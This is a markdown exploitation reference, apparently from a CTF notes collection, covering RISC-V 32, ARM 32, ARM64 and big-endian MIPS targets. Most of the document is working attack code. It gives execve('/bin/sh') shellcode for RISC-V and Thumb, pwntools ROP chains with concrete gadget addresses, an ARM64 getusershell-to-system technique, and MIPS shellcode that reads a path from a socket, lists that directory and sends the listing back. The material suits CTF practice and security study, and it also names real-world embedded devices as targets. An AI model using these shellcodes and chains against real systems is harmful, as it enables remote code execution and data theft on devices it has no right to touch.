# Exotic Architecture Exploitation

Patterns for non-x86-64 targets encountered in CTF and real-world embedded devices.

## Table of Contents
- [RISC-V 32-bit](#risc-v-32-bit)
- [ARM 32-bit](#arm-32-bit)
- [ARM64](#arm64)
- [MIPS Big-Endian](#mips-big-endian)

---

## RISC-V 32-bit

**Architecture summary:** Load-store RISC ISA. 32 general registers (x0–x31). Syscall via `ecall`; syscall number in `a7`, args in `a0`–`a5`, return in `a0`. Compressed extension (C) uses 16-bit instructions — many gadgets are 2 bytes.

**Register conventions:**
| Register | Role |
|----------|------|
| a0–a5 | syscall args / function args |
| a6 | function arg 6 |
| a7 | syscall number |
| ra | return address |
| sp | stack pointer |
| s0–s11 | callee-saved |
| t0–t6 | temporaries |

**Execve shellcode (RISC-V 32-bit):**
```asm
auipc a0, 0x0        # a0 = PC + 0
addi  a0, a0, 24     # a0 = address of "/bin/sh" below
li    a1, 0          # argv = NULL
li    a2, 0          # envp = NULL
li    a7, 221        # execve syscall number
ecall
.string "/bin/sh"
```

```python
context.update(arch="riscv", os="linux")
shellc = asm('''
  auipc a0,0x0
  addi  a0,a0,24
  li a1,0
  li a2,0
  li a7,221
  ecall
  .string "/bin/sh"
''')
payload = cyclic(offset) + p32(stack_leak - delta)
p.send(payload)
sleep(0.1)
p.send(shellc)
```

**ROP on RISC-V 32-bit — multi-stage gadget approach:**
RISC-V has no single `syscall; ret` — `ecall` is its own instruction. Common pattern: find a gadget that loads all registers from stack then calls `ecall`.

```python
# Typical gadget structure found in libc:
# lw ra, N($sp); lw a0, 4($sp); lw a1, 8($sp); ... lw a7, M($sp); ecall; addiu sp,sp,K
# Use this to build execve('/bin/sh', NULL, NULL)

# Two-stage ROP: stage1 re-calls target function with larger read size,
# stage2 reads shell string + execve via ecall gadget

# Stage 1 frame: call do_b2(600) to get bigger read buffer
data = b'\x00'*0x70 + p32(0xdeadbeef) + p32(gadget_load_ret)
data += flat({
    12: p32(600),               # new size arg
    28: p32(exe.sym['do_b2']),  # return address
})

# Stage 2 frame: execve via combined load+ecall gadget
data = b'\x00'*0x70 + p32(0xdeadbeef) + p32(gadget_load_ret)
data += flat({
    4: p32(bss_addr),           # a0 = "/bin/sh" ptr
    8: p32(0),                  # a1 = NULL
    12: p32(0),                 # a2 = NULL
    32: p32(221),               # a7 = execve
    36: p32(ecall_gadget),
})
```

**Testing locally:**
```bash
qemu-riscv32 -E FLAG="testflag" ./binary
qemu-riscv32 -g 1235 ./binary   # attach gdb-multiarch on port 1235
```

**Key quirks:**
- All instructions 32-bit aligned unless compressed extension
- No dedicated `NOP` — use `addi x0, x0, 0` or 2-byte `c.nop`
- `ecall` stops pipeline — no branch delay slot (unlike MIPS)
- Stack args start at `sp+0` for a0 in some ABI conventions

---

## ARM 32-bit

**Architecture summary:** 32-bit ARM (not AArch64). Two ISA states: ARM (4-byte) and Thumb (2/4-byte mixed). Function pointers with LSB=1 call Thumb code. Stack-based calling for args beyond r0–r3. Return address in `lr`; `pc` is a general register — `pop {r0, pc}` jumps to r0.

**Register conventions:**
| Register | Role |
|----------|------|
| r0–r3 | function args, return value in r0 |
| r4–r11 | callee-saved |
| r12 (ip) | scratch |
| r13 (sp) | stack pointer |
| r14 (lr) | link register (return address) |
| r15 (pc) | program counter (usable as jump target) |

**Gadget patterns:**
```asm
pop {r0, pc}             ; load r0 from stack, jump to next gadget
pop {r1, r2, lr}; ...; mov pc, lr   ; load r1, r2, jump
mov r1, r5 ; pop {r4, r5, pc}       ; arg from saved register + load next
```

**ARM 32-bit ROP chain (open/read/write via URL parsing overflow):**
```python
context.update(arch="arm", os="linux")

# ARM 32-bit: each "gadget" is a 4-byte address
# System function addresses direct from binary (no PIE)
system  = 0xa0a8
open_f  = 0x9c74
read_f  = 0xa1a8
write_f = 0x08dcc

pop_r0_pc  = 0x000135f0  # pop {r0, pc}
mov_r1_r5  = 0x00012e38  # mov r1, r5 ; pop {r4, r5, pc}
pop_r4_pc  = 0x00008c80  # pop {r4, pc}
# Set lr=gadget3 so function return goes to next gadget
pop_r1r2_lr = 0x00012908 # pop {r1, r2, lr}; mul r3, r2, r0; sub r1, r1, r3; mov pc, lr

# Build chain: open(path, 0) ; read(fd, buf, size) ; write(1, buf, size)
chain = p32(pop_r1r2_lr) + p32(0) + p32(0) + p32(pop_r4_pc)  # set r1=r2=0
chain += p32(0)                                                  # r4
chain += p32(mov_r1_r5) + p32(0) + p32(0)                      # r1=r5=0
chain += p32(pop_r0_pc) + p32(path_addr) + p32(open_f)
# ... continue for read, write
```

**Thumb shellcode:**
```asm
.syntax unified
.thumb
push {r7}
mov r7, #11          ; execve syscall
adr r0, fname
eor r1, r1
eor r2, r2
svc 0
fname: .string "/bin/sh"
```
```bash
arm-linux-gnueabi-as -mthumb -o sc.o shellcode.s
```

**Key quirks:**
- `blx` to Thumb: target address must have LSB=1 (even if pointing to Thumb function)
- No safe-linking in early glibc; tcache poison easier
- Big-endian ARM (armeb) — use `context.endian = 'big'`
- NEON/FP regs are extra — usually not needed in ROP

---

## ARM64

**Architecture summary:** AArch64 passes the first eight arguments in `x0`–`x7`, returns in `x0`, and uses `x29`/`x30` as frame pointer and link register. Many binaries expose richer call-oriented programming than raw gadget-heavy ROP because epilogues commonly restore many registers and branch via `ret`.

**Register conventions:**
| Register | Role |
|----------|------|
| x0–x7 | function args / return in `x0` |
| x8 | indirect result / syscall helper scratch |
| x19–x28 | callee-saved |
| x29 | frame pointer |
| x30 | link register |
| sp | stack pointer |

### `getusershell()` as an `x0` Setup Gadget for `system()`

When `system()` is available but direct argument control is awkward, look for helper functions that return a useful pointer in `x0`.

Strong pattern:
1. place `/bin/sh` in a trusted global such as the `shells` array used by `getusershell()`,
2. call `getusershell()`, which returns that pointer in `x0`,
3. return directly into `system()`.

Why it works:
- AArch64 calling convention already puts the return value in `x0`,
- `system()` also wants its first argument in `x0`,
- so the helper call becomes a free argument-loading gadget.

This is the AArch64 equivalent of using a libc helper on x86-64 that leaves `rdi` or `rax` in exactly the right place for the next call.

**Practical notes:**
- watch for PAC/BTI in real-world hardened binaries; CTF targets often omit them,
- check whether the helper returns a persistent pointer or advances internal state on each call,
- `ldr x0, [xN]; blr xM` style gadgets are often easier to use than long classical ROP chains.

---

## MIPS Big-Endian

**Architecture summary:** 32-bit MIPS big-endian. Branch delay slot: instruction after `jr $ra` always executes before the jump. Syscall via `syscall 0x040405`. System call number in `$v0`. Args: `$a0`–`$a3`, additional args on stack at `$sp+16`. Return in `$v0`.

**Register conventions:**
| Register | Role |
|----------|------|
| $v0 | syscall number / return value |
| $a0–$a3 | first 4 syscall args |
| $sp+16, $sp+20... | additional args on stack |
| $ra | return address |
| $s0–$s7 | callee-saved |
| $t0–$t9 | temporaries |

**Common MIPS gadget patterns:**
```asm
lw $ra, N($sp); jr $ra; addiu $sp, $sp, M   ; standard load-ret gadget
move $a0, $s0; ...pop...; jr $ra             ; move from saved reg to arg
lw $s0, N($sp); jr $ra; addiu $sp, $sp, M   ; load callee-saved
```

**MIPS syscall shellcode (recvfrom + open + getdents + sendto):**
```python
context.update(arch="mips", endian='big', os="linux")

shellc = asm('''
    li $v0, 4176         # recvfrom
    li $a0, 3            # fd (open socket)
    add $a1, $sp, -1024  # buf = sp - 1024
    li $a2, 0x100        # size
    move $a3, $zero      # flags
    add $s0, $sp, -1048
    sw $s0, 16($sp)      # sockaddr ptr
    add $s0, $sp, -1072
    sw $s0, 20($sp)      # socklen ptr
    syscall 0x040405
    nop                   # branch delay slot

    li $v0, 4005         # open
    add $a0, $sp, -1024  # filename from recvfrom buf
    li $a1, 0x4000       # O_DIRECTORY
    syscall 0x040405
    nop

    add $a0, $zero, $v0  # fd from open
    add $a1, $sp, -1024  # buf
    li $a2, 1024
    li $v0, 4141         # getdents (MIPS 32-bit)
    syscall 0x040405
    nop

    li $v0, 4180         # sendto
    li $a0, 3            # socket fd
    add $a1, $sp, -1024
    add $a2, $zero, $v0  # bytes from getdents
    syscall 0x040405
    nop
''')
```

**Big-endian struct packing:**
```python
# All addresses in ROP chain must be big-endian
payload = p32(0xdeadbeef, endian='big') * 145  # padding
payload += p32(saved_s0, endian='big')
payload += p32(saved_s1, endian='big')
payload += p32(gadget_ra, endian='big')
```

**Key quirks:**
- Every `jr $ra` has a branch delay slot — the instruction at `jr $ra + 4` runs before the jump. Plan gadgets accordingly.
- Stack args for syscall >4 go at fixed positive offsets: `16($sp)`, `20($sp)`, etc.
- MIPS-II vs MIPS-III (32 vs 64-bit address space) — different gadget patterns
- Firmware extraction: mount `.tar.gz` with firmware, run under QEMU user mode or `chroot` + `qemu-mipsel-static`
- UDP-based exploitation: use `context(typ="udp")` in pwntools; normal `p.send(pkt)` works on connected UDP
- `base64.b64encode(payload)` often used when firmware protocol wraps data

**Testing locally:**
```bash
qemu-mips -g 1234 ./binary       # big-endian, attach gdb-multiarch
qemu-mipsel -g 1234 ./binary     # little-endian variant
```

---

See [rop.md](rop.md) for x86-64 shellcode patterns.
See [weird-machines.md](weird-machines.md) for emulator and non-canonical execution environments.
See [windows-pwn.md](windows-pwn.md) for Windows-specific pwn patterns.
